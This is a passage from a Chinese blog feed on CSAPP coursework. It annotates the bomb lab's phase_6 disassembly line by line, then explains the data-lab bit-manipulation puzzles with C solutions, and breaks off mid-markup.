class="hljs-number">401191</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> fe <span class="hljs-number">18</span>          cmp    $<span class="hljs-number">0x18</span>,%rsi<br>  <span class="hljs-number">401195</span>:<span class="hljs-number">74</span> <span class="hljs-number">14</span>                je     <span class="hljs-number">4011</span>ab &lt;phase_6+<span class="hljs-number">0xb7</span>&gt;<br><br>  <span class="hljs-number">401197</span>:<span class="hljs-number">8b</span> <span class="hljs-number">0</span>c <span class="hljs-number">34</span>             <span class="hljs-built_in">mov</span>    (%rsp,%rsi,<span class="hljs-number">1</span>),%ecx <span class="hljs-comment">// 取出栈顶的元素放到ecx</span><br>  <span class="hljs-number">40119</span>a:<span class="hljs-number">83</span> f9 <span class="hljs-number">01</span>             cmp    $<span class="hljs-number">0x1</span>,%ecx <span class="hljs-comment">// 元素和1相比</span><br>  <span class="hljs-number">40119</span>d:<span class="hljs-number">7</span>e e4                jle    <span class="hljs-number">401183</span> &lt;phase_6+<span class="hljs-number">0x8f</span>&gt; <span class="hljs-comment">// 如果元素小于等于1，则跳转</span><br>  <span class="hljs-number">40119f</span>:b8 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x1</span>,%eax <span class="hljs-comment">// eax置为1</span><br>  <span class="hljs-number">4011</span>a4:ba d0 <span class="hljs-number">32</span> <span class="hljs-number">60</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x6032d0</span>,%edx <span class="hljs-comment">// edx置为0x6032d0</span><br>  <span class="hljs-number">4011</span>a9:eb cb                jmp    <span class="hljs-number">401176</span> &lt;phase_6+<span class="hljs-number">0x82</span>&gt;<br><br><span class="hljs-comment">// 上面的操作花了这么大牛劲，就是把6304544 6304528 6304512 6304496 6304480 0x6032d0这六个地址放在了rsp+32 +0 +8 +16 +24 +32 +40的位置 好像刚好放满了这个栈</span><br>  <span class="hljs-number">4011</span>ab:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">5</span>c <span class="hljs-number">24</span> <span class="hljs-number">20</span>       mov    <span class="hljs-number">0x20</span>(%rsp),%rbx <span class="hljs-comment">// 把rbx置为rsp+32指向的值</span><br>  <span class="hljs-number">4011b</span>0:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">28</span>       lea    <span class="hljs-number">0x28</span>(%rsp),%rax <span class="hljs-comment">// 把rax置为rsp+40，即上述操作栈的第二个元素的位置</span><br>  <span class="hljs-number">4011b</span>5:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">74</span> <span class="hljs-number">24</span> <span class="hljs-number">50</span>       lea    <span class="hljs-number">0x50</span>(%rsp),%rsi <span class="hljs-comment">// 把rsi置为rsp+80，即整个栈的终点</span><br>  <span class="hljs-number">4011b</span>a:<span class="hljs-number">48</span> <span class="hljs-number">89</span> d9             mov    %rbx,%rcx <span class="hljs-comment">// 把rcx置为第一个值</span><br>  <span class="hljs-comment">// 这里好像是循环着把一个链表给串起来</span><br>  <span class="hljs-number">4011b</span>d:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">10</span>             <span class="hljs-built_in">mov</span>    (%rax),%rdx <span class="hljs-comment">// 把rdx置为第二个值</span><br>  <span class="hljs-number">4011</span>c0:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">51</span> <span class="hljs-number">08</span>          mov    %rdx,<span class="hljs-number">0x8</span>(%rcx) <span class="hljs-comment">// 把第二个值放到rcx+8指向的位置</span><br>  <span class="hljs-number">4011</span>c4:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c0 <span class="hljs-number">08</span>          add    $<span class="hljs-number">0x8</span>,%rax <span class="hljs-comment">// rax+=1，即指向下一个值</span><br>  <span class="hljs-number">4011</span>c8:<span class="hljs-number">48</span> <span class="hljs-number">39</span> f0             cmp    %rsi,%rax <span class="hljs-comment">// 比较是否到了终点</span><br>  <span class="hljs-number">4011</span>cb:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">4011</span>d2 &lt;phase_6+<span class="hljs-number">0xde</span>&gt; <span class="hljs-comment">// 到了终点则跳转</span><br>  <span class="hljs-number">4011</span>cd:<span class="hljs-number">48</span> <span class="hljs-number">89</span> d1             mov    %rdx,%rcx <span class="hljs-comment">// 否则将rcx变成rdx，即变成第二个点</span><br>  <span class="hljs-number">4011</span>d0:eb eb                jmp    <span class="hljs-number">4011b</span>d &lt;phase_6+<span class="hljs-number">0xc9</span>&gt;<br> <span class="hljs-comment">// 将链表最后一个节点的next指针置为0</span><br>  <span class="hljs-number">4011</span>d2:<span class="hljs-number">48</span> c7 <span class="hljs-number">42</span> <span class="hljs-number">08</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movq   $<span class="hljs-number">0x0</span>,<span class="hljs-number">0x8</span>(%rdx) <br>  <span class="hljs-number">4011</span>d9:<span class="hljs-number">00</span> <br><span class="hljs-comment">// 链表降序排序 443 477 691 924 168 332</span><br>  <span class="hljs-number">4011</span>da:bd <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x5</span>,%ebp <span class="hljs-comment">// ebp置为5</span><br>  <span class="hljs-number">4011</span>df:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">43</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0x8</span>(%rbx),%rax <span class="hljs-comment">// 此时rbx是第一个结点的地址，因此rax是第二个结点的地址</span><br>  <span class="hljs-number">4011e3</span>:<span class="hljs-number">8b</span> <span class="hljs-number">00</span>                <span class="hljs-built_in">mov</span>    (%rax),%eax  <span class="hljs-comment">// 将eax置为第二个结点</span><br>  <span class="hljs-number">4011e5</span>:<span class="hljs-number">39</span> <span class="hljs-number">03</span>                cmp    %eax,(%rbx) <span class="hljs-comment">// 比较第二个结点和第一个结点的值</span><br>  <span class="hljs-number">4011e7</span>:<span class="hljs-number">7</span>d <span class="hljs-number">05</span>                jge    <span class="hljs-number">4011</span>ee &lt;phase_6+<span class="hljs-number">0xfa</span>&gt; <span class="hljs-comment">// 第一个如果要大于等于第二个，那么就跳过炸弹，否则就爆炸</span><br>  <span class="hljs-number">4011e9</span>:e8 <span class="hljs-number">4</span>c <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">4011</span>ee:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">5b</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0x8</span>(%rbx),%rbx<br>  <span class="hljs-number">4011f</span>2:<span class="hljs-number">83</span> ed <span class="hljs-number">01</span>             sub    $<span class="hljs-number">0x1</span>,%ebp<br>  <span class="hljs-number">4011f</span>5:<span class="hljs-number">75</span> e8                jne    <span class="hljs-number">4011</span>df &lt;phase_6+<span class="hljs-number">0xeb</span>&gt;<br>  <span class="hljs-number">4011f</span>7:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">50</span>          add    $<span class="hljs-number">0x50</span>,%rsp<br>  <span class="hljs-number">4011f</span>b:<span class="hljs-number">5b</span>                   pop    %rbx<br>  <span class="hljs-number">4011f</span>c:<span class="hljs-number">5</span>d                   pop    %rbp<br>  <span class="hljs-number">4011f</span>d:<span class="hljs-number">41</span> <span class="hljs-number">5</span>c                pop    %r12<br>  <span class="hljs-number">4011f</span>f:<span class="hljs-number">41</span> <span class="hljs-number">5</span>d                pop    %r13<br>  <span class="hljs-number">401201</span>:<span class="hljs-number">41</span> <span class="hljs-number">5</span>e                pop    %r14<br>  <span class="hljs-number">401203</span>:c3                   retq   <br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp_lab1</title>
    <link href="/2023/07/27/csapp-lab1/"/>
    <url>/2023/07/27/csapp-lab1/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#bitxor">bitXor</a></li><li><a href="#tmin">tmin</a></li><li><a href="#istmax">isTmax</a></li><li><a href="#alloddbits">allOddBits</a></li><li><a href="#negate">negate</a></li><li><a href="#isasciidigit">isAsciiDigit</a></li><li><a href="#conditional">conditional</a></li><li><a href="#islessorequal">isLessOrEqual</a></li><li><a href="#logicalneg">logicalNeg</a></li><li><a href="#howmanybits">howManyBits</a></li><li><a href="#floatscale2">floatScale2</a></li><li><a href="#floatfloat2int">floatFloat2Int</a></li><li><a href="#floatpower2">floatPower2</a></li></ul><p>修改<code>bits.c</code>，使其满足<code>btest</code>的测试，代码规范<code>./dlc bits.c</code><br>测试</p><ol><li>make clean</li><li>make btest</li><li>.&#x2F;btest</li></ol><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224201936.png" alt="20231224201936"></p><h1 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h1><p>思路</p><ol><li>题目的意思是用按位&amp;和取反~实现异或^操作。</li><li>即x和y的同一位置如果都是1或者都是0，那么异或之后是0，否则是1<ol><li>x &amp; y的结果的某一位为1，代表x和y的这一位都是1。而如果x和y的某一位都是1，那么经过异或操作时候，这一位应该是0，所以对这个结果取反，得到a。a的二进制表示中，每一个0都代表这个位置的x和y都是1。</li><li>刚刚处理了x和y同一位置都是1，现在应该处理两个位置都是0。可以通过先分别对x和y取反，将这个问题又转为处理同一位置为1。通过和上一步一样的操作，可以得到b。</li><li>a和b的二进制表示中，每一个0都代表x和y在这个位置同时是0或者同时是1。那么将a&amp;b就得到了异或的结果，即相同为0，不同为1。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * bitXor - x^y using only ~ and &amp;</span><br><span class="hljs-comment"> *   Example: bitXor(4, 5) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp;</span><br><span class="hljs-comment"> *   Max ops: 14</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bitXor</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>  <span class="hljs-comment">// 两个1的位置是0，否则是1</span><br>  <span class="hljs-type">int</span> a = ~(x &amp; y);<br>  <span class="hljs-comment">// 两个0的位置是0，否则是1</span><br>  <span class="hljs-type">int</span> b = ~(~x &amp; ~y);<br>  <span class="hljs-comment">// 因此将a和b按位&amp;之后，两个1或者两个0的位置都是0，其他位置是1</span><br>  <span class="hljs-keyword">return</span> a &amp; b;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h1 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h1><p>思路</p><ol><li>送分题<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * tmin - return minimum two&#x27;s complement integer</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 4</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">tmin</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>; &#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h1><p>思路</p><ol><li>验证x是不是最大的有符号整数，最大的有符号整数应该是0x7fffffff，记为tmax</li><li>如果只能用位运算，那么要尽量将操作的数往0或者0xffffffff上靠，可以发现tmax+tmax+1正好就是0xffffffff。拿到了0xffffffff，那就好办了，对它取反，正好得到0，也就是下面代码里的b</li><li>那么是不是只有tmax可以通过~(x+x+1)的操作得到0呢，不是！0xffffffff也是可以得到0的。因此还需要对它进行特判。它加上1或者取反正好就是0,再取个非，刚好就是1，也就是下面代码里的c。</li><li>综上所述，b为0，并且c也等于0，才能够证明x是Tmax<br>易错点</li><li>这一题相当于是根据Tmax的特点进行一些操作，得到一个只有Tmax才能经过这一系列操作得到的值。但是还有一个边界情况那就是0xffffffff需要特判。写代码的时候要小心这些corn case<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span><br><span class="hljs-comment"> *     and 0 otherwise</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | +</span><br><span class="hljs-comment"> *   Max ops: 10</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isTmax</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-comment">// 0xffffffff，这一步不能用异或</span><br>  <span class="hljs-type">int</span> a = x + x + <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">// 0x00000000，如果b为0，那么b要么是0x3fffffff，要么是0xffffffff</span><br>  <span class="hljs-type">int</span> b = ~a;<br>  <span class="hljs-comment">// 排除x为0xffffffff，如果x是0xffffffff，那么c就是1，否则c就是0</span><br>  <span class="hljs-type">int</span> c = !(x + <span class="hljs-number">1</span>);<br>  <span class="hljs-comment">// 只有b和c都是0，才返回1</span><br>  <span class="hljs-keyword">return</span> !(b | c);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h1><p>思路</p><ol><li>这一题要判断这个数是否满足：所有的奇数位都是1</li><li>那么可以通过0xAAAAAAAA这个数与x进行按位与，将取出所有的奇数位，并将偶数为置0</li><li>如果这个数所有奇数位都是1，那么它现在应该和0xAAAAAAAA相同。相同的话异或为0，再取个反，刚好是1。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span><br><span class="hljs-comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span><br><span class="hljs-comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">allOddBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-comment">// 构造出奇数位均为1的数</span><br>  <span class="hljs-type">int</span> a = (<span class="hljs-number">0xaa</span> &lt;&lt; <span class="hljs-number">24</span>) + (<span class="hljs-number">0xaa</span> &lt;&lt; <span class="hljs-number">16</span>) + (<span class="hljs-number">0xaa</span> &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-number">0xaa</span>;<br>  <span class="hljs-comment">// 将a看做掩码，取出x中所有奇数位</span><br>  <span class="hljs-type">int</span> b = x &amp; a;<br>  <span class="hljs-comment">// 判断a和b是否相同，只有当a和b相同，异或才为0，那么取！后才为1</span><br>  <span class="hljs-keyword">return</span> !(a ^ b);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h1><p>思路</p><ol><li>送分题，按位取反，末位加1<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * negate - return -x</span><br><span class="hljs-comment"> *   Example: negate(1) = -1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 5</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">negate</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123; <span class="hljs-keyword">return</span> (~x) + <span class="hljs-number">1</span>; &#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h1><p>思路</p><ol><li>判断这个数是否在$0x30 &lt;&#x3D; x &lt;&#x3D; 0x39$这个范围内</li><li>这个范围可以写成十六进制，即<ol><li>0x 0011 0000</li><li>0x 0011 1001</li></ol></li><li>可以发现，高28位一定是0x0000003，低4位则在0x0到0x9之间。<ol><li>所以先将高28位取出来，判断是否是0x0000003</li><li>再将低4位取出来<ol><li>低4位里，如果第4位是0，那么对低三位则没有要求</li><li>如果第4位是1，那么第二位和第三位一定是0，对低1位没有要求</li></ol></li></ol></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27;</span><br><span class="hljs-comment"> * to &#x27;9&#x27;) Example: isAsciiDigit(0x35) = 1. isAsciiDigit(0x3a) = 0.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x05) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isAsciiDigit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-comment">// 0x 0011 0000</span><br>  <span class="hljs-comment">// 0x 0011 1001</span><br>  <span class="hljs-comment">// 首先，右移4位之后，应该是0x3，即a=1</span><br>  <span class="hljs-type">int</span> a = !((x &gt;&gt; <span class="hljs-number">4</span>) ^ (<span class="hljs-number">0x3</span>));<br>  <span class="hljs-comment">// 低4位，要么第4位为0，要么就只能是1001或者1000</span><br>  <span class="hljs-comment">// b为1，代表第4位为0</span><br>  <span class="hljs-type">int</span> b = !((x &gt;&gt; <span class="hljs-number">3</span>) &amp; <span class="hljs-number">1</span>);<br>  <span class="hljs-comment">// c为1，代表为1001或者1000，即第1位和第4位无所谓，但是第2和第3位必须是0</span><br>  <span class="hljs-type">int</span> c = !(x &amp; <span class="hljs-number">0x6</span>);<br>  <span class="hljs-comment">// printf(&quot;-----------------\n%x\n%d\n%d\n%d\n%d\n&quot;,x,a,b,c,a&amp;(b|c));</span><br>  <span class="hljs-keyword">return</span> a &amp; (b | c);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h1><p>思路</p><ol><li>实现三目运算符</li><li>主要是看x，如果x不为0，那么返回y，如果x为0，那么返回z。</li><li>这个做法就有点tricky<ol><li>如果x不为0，那么将x变为0xffffffff</li><li>如果x为0，那么将x变为0 </li><li>在上面改变的基础上，<ol><li>如果x不为0，那么应该返回y，此时的x经过变换之后是全1<ol><li>将x和y按位与，按位与的结果就是y</li><li>将~x和z按位与，按位与的结果是0</li><li>将上述两个结果进行按位或操作，得到的就是y</li></ol></li><li>之所以使用按位或操作，是因为如果x为0，依然可以返回正确结果。此时x和y按位与就是0，~x和z按位与的结果就是z，按位或之后的结果就是z</li><li>如何将非0的x变为全1呢？首先通过两次！操作，可以把非零的x变为1，此时对它取反再加1就是全1了</li></ol></li></ol></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * conditional - same as x ? y : z</span><br><span class="hljs-comment"> *   Example: conditional(2,4,5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 16</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">conditional</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> z)</span> &#123;<br>  <span class="hljs-comment">// 如果x不为0，则得到一个全1的数，如果x为0，则得到一个全0的数</span><br>  <span class="hljs-comment">// 如果x为0，则得到0，如果x非0，则得到1</span><br>  <span class="hljs-type">int</span> a = !!x;<br>  <span class="hljs-comment">// 如果a为0，则b为0，如果a为1，则b为-1，即全1</span><br>  <span class="hljs-type">int</span> b = ~a + <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">// c和d一定有一个为0</span><br>  <span class="hljs-type">int</span> c = b &amp; y;<br>  <span class="hljs-type">int</span> d = ~b &amp; z;<br>  <span class="hljs-keyword">return</span> c | d;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h1><p>思路</p><ol><li>判断x是否小于等于y</li><li>如果x和y符号不同<ol><li>如果x为负数，则小于y</li><li>如果x为正数，则大于y</li></ol></li><li>如果x和y符号相同，则需要计算x和y的差值，因为不可以直接用减号，计算x-y，其实就是计算x+（y的补码）<ol><li>如果差值小于0，则小于y</li><li>如果差值大于0，则大于y</li></ol></li><li>还需要特判一下x是否等于y<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0</span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>  <span class="hljs-comment">// 如果符号不同，则正数更大，如果符号相同，则看差值，还要特判一下x是否和y相同</span><br>  <span class="hljs-type">int</span> x_flag = x &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">1</span>;<br>  <span class="hljs-type">int</span> y_flag = y &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">// 如果flag_not_same为1，则代表符号不同，如果为0，则代表符号相同</span><br>  <span class="hljs-type">int</span> flag_not_same = x_flag ^ y_flag;<br>  <span class="hljs-comment">// 还要结合差值的正负来看,x-y，即x+(y的补码)</span><br>  <span class="hljs-type">int</span> y_ = ~y + <span class="hljs-number">1</span>;<br>  <span class="hljs-type">int</span> sub_flag = (x + y_) &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">// 如果符号不同并且x为负，即a=1，即x_flag=1，并且flag_not_same=1，</span><br>  <span class="hljs-type">int</span> a = flag_not_same &amp; x_flag;<br>  <span class="hljs-comment">// 如果符号相同，并且差值为负，即b=1，即flag_same=0,sub_flag=1;</span><br>  <span class="hljs-type">int</span> b = !(flag_not_same | (!sub_flag));<br>  <span class="hljs-comment">// 如果两个数相同，则c为1，否则c为0</span><br>  <span class="hljs-type">int</span> c = !(x ^ y);<br>  <span class="hljs-keyword">return</span> a | b | c;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h1><p>思路</p><ol><li>对于0，返回1，对于非0的数，返回0</li><li>其实只需要对确定x是0后返回1，其他情况都是返回0</li><li>做法很tricky<ol><li>首先，对于任何符号位为0的数，加上Tmax之后，只有0不会导致溢出为负数。</li><li>因此只需要满足下面两个条件就可以返回1，否则返回0<ol><li>x的符号位是0</li><li>x+Tmax之后的符号位也是0</li></ol></li></ol></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * logicalNeg - implement the ! operator, using all of</span><br><span class="hljs-comment"> *              the legal operators except !</span><br><span class="hljs-comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">logicalNeg</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-comment">// 先得到最大的32位有符号数</span><br>  <span class="hljs-type">int</span> T_max = ~(<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>);<br>  <span class="hljs-comment">// 得到x的符号</span><br>  <span class="hljs-type">int</span> x_sign = x &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">// 将x和T_max相加，除了0，其他的数加上去之后一定是一个负数</span><br>  <span class="hljs-type">int</span> a = x + T_max;<br>  <span class="hljs-type">int</span> a_sign = a &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">// 只有当x和a的sign都是0时，才返回1，否则返回0</span><br>  <span class="hljs-keyword">return</span> (x_sign ^ <span class="hljs-number">1</span>) &amp; (a_sign ^ <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="howManyBits"><a href="#howManyBits" class="headerlink" 